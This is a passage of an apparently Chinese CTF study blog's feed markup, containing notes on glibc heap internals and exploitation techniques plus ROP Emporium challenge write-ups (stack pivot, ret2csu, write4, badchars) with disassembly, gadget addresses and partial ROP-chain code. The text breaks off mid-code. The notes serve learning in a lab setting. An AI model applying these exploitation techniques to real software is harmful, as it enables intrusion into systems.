class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>brk 参数是指针，设置break值<br>所以先用sbrk(0)获得当前break值的指向指针<br>再设置brk(sbrk(0)+4096)</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h4><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p><pre><code>addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></pre><p>munmap()</p><pre><code>char* addraddr = (char*) malloc(1000);</code></pre><p>虽然只是申请了1000个字节，但是我们却得到了0x0806c000-0x0804b000=0x21000个字节的堆，int(0x21000,10)/1024=132，原来这132KB的堆空间叫做<code>arena</code>，此时因为是主线程分配的，所以这个区域叫做 <code>main arena</code>，（称这一块连续的内存区域为 arena，）申请的内存会一直从这个 arena 中获取，直到空间不足，当 arena 空间不足时，它可以通过增加<code>brk</code>的方式来增加堆的空间。</p><p>this shows heap memory is created by increasing program break location ( ie) using brk syscall</p><h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>Allocated memory region (of size 1000 bytes) is <code>released only to ‘glibc malloc’ library</code>,‘glibc malloc’ doesnt get new heap memory from kernel, instead it will try to find a free block in bin. And only when no free block exists, it obtains memory from kernel.</p><p>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</p><p>看出实际真的分配给程序的内存为1M(b7500000-b7600000)。heap memory of size 1 MB ,而且，只有132KB的部分具有可读可写权限，这一块连续的区域成为<code>thread arena</code>。是使用<code>mmap()</code>分配的，而不是sbrk()<br>当用户请求的内存大于128KB时，并且没有任何arena有足够的空间时，那么系统就会执行mmap函数来分配相应的内存空间，而不是sbrk()。这与这个请求来自于主线程还是从线程无关。</p><p> Instead allocated memory region (of size 1000 bytes) is released to ‘glibc malloc’, which adds this freed block to its thread arenas bin.</p><h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><pre><code>gef➤  x/32gx $rax-0x100x555555559290:    0x0000000000000000    0x00000000000000210x5555555592a0:    0x0000000000000000    0x00000000000000000x5555555592b0:    0x0000000000000000    0x0000000000020d510x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x00000000000000000x5555555592e0:    0x0000000000000000    0x00000000000000000x5555555592f0:    0x0000000000000000    0x00000000000000000x555555559300:    0x0000000000000000    0x00000000000000000x555555559310:    0x0000000000000000    0x00000000000000000x555555559320:    0x0000000000000000    0x0000000000000000</code></pre><p>presize 8字节<br>size 8字节<br>0x5555555592a0 开始是user-data<br>64位最小分配16B，32位最小分配8B，所以是<code>16+8+8+1=21</code><br>user-data+header-len+pre_(1)=21<br><code>size最低三位，LSB表示前一chunk是否分配。</code></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>结尾于arena的最高地址处<br>堆地址从低地址向高地址增长<br><a href="https://imgtu.com/i/6Vae81"><img src="https://s3.ax1x.com/2021/03/04/6Vae81.png" alt="6Vae81.png"></a></p><p>在程序在向堆管理器申请内存时，没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</p><p>chunk()</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>prev_size: If the <code>previous chunk is free</code>, this field contains <code>the size of previous chunk</code>. Else if previous chunk is <code>allocated</code>, this field contains<code> previous chunk’s user data</code>.<br>size: This field contains the size of this allocated chunk. <code>Last 3 bits</code> of this field contains flag information.</p><pre><code>PREV_INUSE (P) – This bit is set when previous chunk is allocated.IS_MMAPPED (M) – This bit is set when chunk is mmap’d.NON_MAIN_ARENA (N) – This bit is set when this chunk belongs to a thread arena.</code></pre><p>Other fields of malloc_chunk (like fd, bk) <code>is NOT used for allocated chunk</code>. Hence in place of these fields user data is stored.<br>·由于存储malloc_chunk以及对齐目的需要一些额外的空间，因此用户请求的大小将转换为可用大小（内部表示大小）。<br>·转换的方式是不会设置可用大小的最后3位，因此将其用于存储标志信息。<br><a href="https://imgtu.com/i/6VaHR1"><img src="https://s3.ax1x.com/2021/03/04/6VaHR1.png" alt="6VaHR1.png"></a></p><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><p>prev_size: <code>No two free chunks can be adjacent together</code>. When both the chunks are free, its <code>gets combined into one single free chunk</code>. Hence always previous chunk to this freed chunk would be allocated and therefore prev_size contains previous chunk’s user data.<br><code>fd</code>: Forward pointer – Points to <code>next chunk</code> in the same bin (and NOT to the next chunk present in physical memory).<br>bk: Backward pointer – Points to previous chunk in the same bin (and NOT to the previous chunk present in physical memory).<br><a href="https://imgtu.com/i/6VaOsK"><img src="https://s3.ax1x.com/2021/03/04/6VaOsK.png" alt="6VaOsK.png"></a></p><h2 id="bins-垃圾桶"><a href="#bins-垃圾桶" class="headerlink" title="bins 垃圾桶"></a>bins 垃圾桶</h2><p>已经申请到的内存空间大小进行释放，来决定放入哪类 bins 当中去。<br>Fast bin<br>Unsorted bin<br>Small bin<br>Large bin</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>64位下<br><code>Chunks of size 0x20 to 0x80 bytes is called a fast chunk.</code><br>其中的0x10字节是用来存prev_size和size</p><p>Number of bins – 10<br>Each fast bin contains a <code>single linked list</code> (a.k.a binlist) of free chunks.<br>Fast bins contain a binlist of chunks whose sizes are 8 bytes apart. ie) First fast bin (index 0) contains binlist of chunks of size 16 bytes, second fast bin (index 1) contains binlist of chunks of size  24 bytes and so on…</p><p>During malloc initialization, maximum fast bin size is set to 64 (!80) bytes.</p><h3 id="small-and-large-bins"><a href="#small-and-large-bins" class="headerlink" title="small and large bins"></a>small and large bins</h3><p>When small or large chunk gets freed instead of adding them in to their respective bins, <code>its gets added into unsorted bin.</code> 重要<br>This approach gives ‘glibc malloc’ a second chance to reuse the recently freed chunks.<br>Chunk size – There is no size restriction, chunks of any size belongs to this bin.</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><pre><code>────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)</code></pre><p><code>a chunk of size 0x20-0x2f would fit into idx 0</code>, a chunk of size<code> 0x30-0x3f would fit into idx 1</code>, and so on and so forth.</p><p>有七条链表，每个链表有一个头，后面接着free的块<br>链表后进先出，使用头插法</p><h3 id="tcachebins"><a href="#tcachebins" class="headerlink" title="tcachebins"></a>tcachebins</h3><p>在glibc2.26中引入<br>一个链条同一时间只能有7个块<br>可以有64条链条<br>size任意0x20-0x410<br>当size不大（这个程度后面讲）堆块free后，不会直接进入各种bin，而是进入tcache，如果下次需要该大小内存，直接讲tcache分配出去<br>多出的块到达fastbins，（在大小符合的情况下）<br><a href="https://www.freebuf.com/articles/system/234219.html">https://www.freebuf.com/articles/system/234219.html</a><br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p><p>tcachebins就相当于fastbins 而且较少检查</p><h3 id="Unsorted-Large-and-Small-Bins"><a href="#Unsorted-Large-and-Small-Bins" class="headerlink" title="Unsorted, Large and Small Bins"></a>Unsorted, Large and Small Bins</h3><p>双向链表<br>头部都在同一数组中，有不同的索引值。<br>0x00:         Not Used<br>0x01:         Unsorted Bin<br>0x02 - 0x3f:  Small Bin<br>0x40 - 0x7e:  Large Bin</p><p>Unsorted Bin只有一条链， 62 for the Small Bin, and 63 for the Large Bin</p><p>The <code>small bins</code> on x64 consists of chunk <code>sizes under 0x400</code> (1024 bytes), and on x86 consists of chunk sizes<code>under 0x200</code>(512 bytes), and the<code> large bin consists of values above those</code>.</p><p><strong>释放后，首先插入的是unsorted bin</strong><br>since the unsorted bin chunk could not serve the requested size of 0x1000, it was sorted to its corresponding list of in the small bin at idx 4<br>当再次分配但不满足要求时，将进行排序 到相应的bin上<br>若满足要求，就分配<br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p><p>lagestbin 中还有fwd_nextsize and bk_nextsize</p><h3 id="Consolidation-合并"><a href="#Consolidation-合并" class="headerlink" title="Consolidation 合并"></a>Consolidation 合并</h3><p>相邻的空闲块都会合并</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>The Top Chunk is essentially a large heap chunk that holds currently unallocated data.<br>first time calling malloc reiterate the top chunk holds unallocated data that isn’t in the bin list.</p><p>malloc will try to allocate chunks from the bin lists before allocating them from the top chunk</p><p>We can see that two things have happened to the top chunk. Firstly that it moved down <code>to 0x602120 from 0x602020</code> to make room for the new allocation from itself. Secondly, we see that it’s <code>size was shrunk by 0x100</code>, because of the 0x100 byte allocation from it.<br>低地址向高地址增长</p><p>depending on the version of malloc and if the chunk size is fast bin or tcache, this behavior doesn’t always show itself.<br>挨着top chunk，释放并不一定回到top chunk，旧的size值并不会清零，我的虚拟机上运行就变为<code>tcachebins </code></p><pre><code>gef➤  heap bins ──────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7f9fb80 ────────────────────────────────────────────────────────────────Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x5555555592c0, size=0x100, flags=PREV_INUSE) </code></pre><p> one thing you will see us do a lot of is allocated a small chunk in between our freed chunks and the top chunk, just to prevent that consolidation.<br>攻击时，要阻止释放的chunk回到top chunk，所以中间放一个小块分配内存。</p><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>contains the <code>head pointers </code>for the bin lists,<br>heap bins命令下可以显示</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>基于这些bug:<br>leverage the bugs and a bit of heap grooming to edit a freed chunk in one of the bin lists. Then from being able to edit a freed chunk in one of the bin lists we can launch a bin attack</p><pre><code>+--------------------+----------------------------+-----------------------+|   Bug Used         |  Bin Attack                |   House               |+--------------------+----------------------------+-----------------------+|                    |  Fast Bin Attack           |   House of Spirit     ||   Double Free      |  tcache attack             |   House of Lore       ||   Heap Overflow    |  Unsorted Bin Attck        |   House of Force      ||   Use After Free   |  Small / Large Bin Attck   |   House of Einherjar  ||                    |  Unsafe Unlink             |   House of Orange     |+--------------------+----------------------------+-----------------------+</code></pre><p>两大利器gef 和 源码 malloc.c<br>When you attempt to use LD_PRELOAD to have a binary use a specific libc file, you might find an issue if the linker’s are not compatible. </p><h2 id="fastbin-链表头插法"><a href="#fastbin-链表头插法" class="headerlink" title="fastbin 链表头插法"></a>fastbin 链表头插法</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/double_free">https://heap-exploitation.dhavalkapil.com/attacks/double_free</a><br>分配 也是从头部开始分配</p><p>double free 原理，两次释放，将同一块重复加入链表中，分配自然重复使用了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;堆利用Heap-Exploitation&quot;&gt;&lt;a href=&quot;#堆利用Heap-Exploitation&quot; class=&quot;headerlink&quot; title=&quot;堆利用Heap Exploitation&quot;&gt;&lt;/a&gt;堆利用Heap Exploitation&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&quot;&gt;https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&quot;&gt;https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基础知识学习ptmalloc&lt;/p&gt;
&lt;h2 id=&quot;命令：：&quot;&gt;&lt;a href=&quot;#命令：：&quot; class=&quot;headerlink&quot; title=&quot;命令：：&quot;&gt;&lt;/a&gt;命令：：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;gef➤  x/32gx &amp;amp;main_arena &lt;/code&gt;&lt;br&gt;&lt;code&gt;gef➤  heap bins &lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Heap" scheme="http://finsenty54.github.io/categories/Heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium pivot + ret2csu</title>
    <link href="http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/"/>
    <id>http://finsenty54.github.io/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/</id>
    <published>2021-03-02T08:49:03.000Z</published>
    <updated>2021-03-02T08:51:47.679Z</updated>
    
    <content type="html"><![CDATA[<p>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><pre><code>objdump -T libpivot32.so 查看所有符号rabin2 -E ./libpivot.so 也可以查看 -E              globally exportable symbolsobjdump -j .text -d ./ret2csuobjdump -x ret2csugef➤  search-pattern 0x4004d0 查询含有0x4004d0 的地址</code></pre><a id="more"></a><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4">https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4</a></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><p>x86<br>函数参数在函数返回地址的上方<br>x64<br>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。<br>内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。</p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>stack pivot<br>To “stack pivot” just means to move the stack pointer elsewhere.</p><p>用命令可以发现<br>10   0x0000077d 0x0000077d GLOBAL FUNC   43       foothold_function<br>18   0x00000974 0x00000974 GLOBAL FUNC   164      ret2win<br>偏移量为1F7</p><p>stack smash<br>EBP-0X28<br>可以写入0x38<br>40+4 溢出到返回地址</p><p>0x080487b4      ff7508         push dword [arg_8h]<br>第一次写入的地方是指针，我看错了，以为直接写入arg_8h处，这里放第二段较长的ROP链</p><p>大体思路：先调用一次foothold，将got表项的内容加载进寄存器，而不是表项地址，加上ret2win的偏移，调用</p><h2 id="ret2rsu"><a href="#ret2rsu" class="headerlink" title="ret2rsu"></a>ret2rsu</h2><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>ret2win 的三个参数放在<br>│           ; arg uint32_t arg1 @ rdi<br>│           ; arg uint32_t arg2 @ rsi<br>│           ; arg uint32_t arg3 @ rdx</p><h3 id="查看-libc-csu-init代码"><a href="#查看-libc-csu-init代码" class="headerlink" title="查看__libc_csu_init代码"></a>查看__libc_csu_init代码</h3><p><code>objdump -j .text -d ./ret2csu</code></p><pre><code>0000000000400640 &lt;__libc_csu_init&gt;:  400640:    41 57                    push   %r15  400642:    41 56                    push   %r14  400644:    49 89 d7                 mov    %rdx,%r15  400647:    41 55                    push   %r13  400649:    41 54                    push   %r12  40064b:    4c 8d 25 9e 07 20 00     lea    0x20079e(%rip),%r12        # 600df0 &lt;__frame_dummy_init_array_entry&gt;  400652:    55                       push   %rbp  400653:    48 8d 2d 9e 07 20 00     lea    0x20079e(%rip),%rbp        # 600df8 &lt;__do_global_dtors_aux_fini_array_entry&gt;  40065a:    53                       push   %rbx  40065b:    41 89 fd                 mov    %edi,%r13d  40065e:    49 89 f6                 mov    %rsi,%r14  400661:    4c 29 e5                 sub    %r12,%rbp  400664:    48 83 ec 08              sub    $0x8,%rsp  400668:    48 c1 fd 03              sar    $0x3,%rbp  40066c:    e8 5f fe ff ff           callq  4004d0 &lt;_init&gt;  400671:    48 85 ed                 test   %rbp,%rbp  400674:    74 20                    je     400696 &lt;__libc_csu_init+0x56&gt;  400676:    31 db                    xor    %ebx,%ebx  400678:    0f 1f 84 00 00 00 00     nopl   0x0(%rax,%rax,1)  40067f:    00   400680:    4c 89 fa                 mov    %r15,%rdx  400683:    4c 89 f6                 mov    %r14,%rsi  400686:    44 89 ef                 mov    %r13d,%edi  400689:    41 ff 14 dc              callq  *(%r12,%rbx,8)  40068d:    48 83 c3 01              add    $0x1,%rbx  400691:    48 39 dd                 cmp    %rbx,%rbp  400694:    75 ea                    jne    400680 &lt;__libc_csu_init+0x40&gt;  400696:    48 83 c4 08              add    $0x8,%rsp  40069a:    5b                       pop    %rbx  40069b:    5d                       pop    %rbp  40069c:    41 5c                    pop    %r12  40069e:    41 5d                    pop    %r13  4006a0:    41 5e                    pop    %r14  4006a2:    41 5f                    pop    %r15  4006a4:    c3                       retq     4006a5:    90                       nop  4006a6:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)  4006ad:    00 00 00 </code></pre><p>直接用ROPgadget搜有些代码搜不到的</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>要使用ret2csu<br>就需要绕过call<br>这是[ ]指针，需要解引用，即调用函数</p><p><code>objdump -x ret2csu </code></p><pre><code> 10 .init         00000017  00000000004004d0  00000000004004d0  000004d0  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE 11 .plt          00000030  00000000004004f0  00000000004004f0  000004f0  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 12 .text         00000192  0000000000400520  0000000000400520  00000520  2**4                  CONTENTS, ALLOC, LOAD, READONLY, CODE 13 .fini         00000009  00000000004006b4  00000000004006b4  000006b4  2**2                  CONTENTS, ALLOC, LOAD, READONLY, CODE</code></pre><p>可以看到一共有四块代码<br>选择.init</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/ret2csu]└──╼ $objdump -j .init -d ./ret2csu ./ret2csu:     file format elf64-x86-64Disassembly of section .init:00000000004004d0 &lt;_init&gt;:  4004d0:    48 83 ec 08              sub    $0x8,%rsp  4004d4:    48 8b 05 1d 0b 20 00     mov    0x200b1d(%rip),%rax        # 600ff8 &lt;__gmon_start__&gt;  4004db:    48 85 c0                 test   %rax,%rax  4004de:    74 02                    je     4004e2 &lt;_init+0x12&gt;  4004e0:    ff d0                    callq  *%rax  4004e2:    48 83 c4 08              add    $0x8,%rsp  4004e6:    c3                       retq   </code></pre><p>gdb-ref<br><code>gef➤  search-pattern 0x4004d0</code></p><pre><code>  0x600e38 - 0x600e44  →   &quot;\xd0\x04\x40[...]&quot; </code></pre><p>同时rbx=0 rbp=1</p><p>csu代码片段使用了两次</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码：&lt;a href=&quot;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&quot;&gt;https://github.com/Finsenty54/attack-code/tree/master/ROPemporium&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;objdump -T libpivot32.so 查看所有符号
rabin2 -E ./libpivot.so 也可以查看
 -E              globally exportable symbols
objdump -j .text -d ./ret2csu
objdump -x ret2csu
gef➤  search-pattern 0x4004d0 查询含有0x4004d0 的地址&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="rop_emporium" scheme="http://finsenty54.github.io/categories/rop-emporium/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium 第三到四题</title>
    <link href="http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/"/>
    <id>http://finsenty54.github.io/2021/01/15/ROP_ropemporium_%E7%AC%AC%E4%B8%89%E5%88%B0%E5%9B%9B%E9%A2%98/</id>
    <published>2021-01-15T12:22:50.000Z</published>
    <updated>2021-01-15T12:24:37.724Z</updated>
    
    <content type="html"><![CDATA[<p>ROP Emporium write4,badchars,fluff<br>write4和badchars都解出来了，fluff找不到有用的gadget<br>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p><a id="more"></a><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>瞎搜找到的：<br><a href="https://github.com/abatchy17/ROP-Emporium">https://github.com/abatchy17/ROP-Emporium</a></p><ol><li>Get function names: <code>nm binary | grep &#39; t &#39;</code></li><li>Get GOT entries: <code>readelf --relocs binary</code></li><li>Get PLT entries: <code>objdump -M intel -dj .plt binary</code></li><li>Get strings: <code>strings</code> binary or the much better alternative <code>rabin2 -z binary</code></li><li>Virtual address space layout: <code>vmmap </code>in PEDA after starting program, otherwise other modules aren’t mapped yet.</li></ol><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>当前指令地址<code>PC</code></p><pre><code>objdump -sobjdump -R objdump --section=.plt -d ./write432 //查看plt</code></pre><p>./write432:     file format elf32-i386</p><pre><code>Disassembly of section .plt:080483a0 &lt;.plt&gt;: 80483a0:    ff 35 04 a0 04 08        pushl  0x804a004 80483a6:    ff 25 08 a0 04 08        jmp    *0x804a008 80483ac:    00 00                    add    %al,(%eax)    ...080483b0 &lt;pwnme@plt&gt;: 80483b0:    ff 25 0c a0 04 08        jmp    *0x804a00c 80483b6:    68 00 00 00 00           push   $0x0 80483bb:    e9 e0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483c0 &lt;__libc_start_main@plt&gt;: 80483c0:    ff 25 10 a0 04 08        jmp    *0x804a010 80483c6:    68 08 00 00 00           push   $0x8 80483cb:    e9 d0 ff ff ff           jmp    80483a0 &lt;.plt&gt;080483d0 &lt;print_file@plt&gt;: 80483d0:    ff 25 14 a0 04 08        jmp    *0x804a014 80483d6:    68 10 00 00 00           push   $0x10 80483db:    e9 c0 ff ff ff           jmp    80483a0 &lt;.plt&gt;</code></pre><p><code>objdump -j .plt -d ./write432</code>命令效果一样</p><pre><code>ROPgadget --binary ./write432 --only &#39;mov|ret&#39;ROPgadget --binary ./write432 --only &#39;mov|ret&#39; | grep ebx</code></pre><p><strong>要点：</strong>print_file参数是一个地址，所以不能用字符串</p><pre><code>0x00001018    0x8 0x0804a018    0x8 -rw- .data</code></pre><p>我选择把字符串放到data段上。</p><pre><code>dataaddress=p32(0x0804a018)data1=b&#39;flag&#39;data2=b&#39;.txt&#39;</code></pre><p>第一次我数据没有分开，ebp只有32位，一次只能传4字节，我第一次竟然没有认识到</p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><pre><code>│           0x0040061b      bfb4064000     mov edi, str.nonexistent    ; 0x4006b4 ; &quot;nonexistent&quot;│           0x00400620      e8ebfeffff     call sym.imp.print_file</code></pre><p>参数传到RDI<br>    #0x0000000000400628 : mov qword ptr [r14], r15 ; ret<br>    #0x0000000000400690 : pop r14 ; pop r15 ; ret<br>    #0x0000000000400693 : pop rdi ; ret</p><pre><code>gadget=popret+dataaddress+data+movretgadget+=popret1+dataaddressgadget+=printfile</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h3><p> Badchars are the reason that encoders such as shikata-ga-nai exist.<br>这里，会将badchars替换为<code>0xeb</code></p><p><em>IDA永远的神</em><br>反编译</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;badchars are: &#x27;x&#x27;, &#x27;g&#x27;, &#x27;a&#x27;, &#x27;.&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  v1 = read(<span class="number">0</span>, v4, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] == badcharacters[j] )</span><br><span class="line">        v4[i] = <span class="number">-21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span 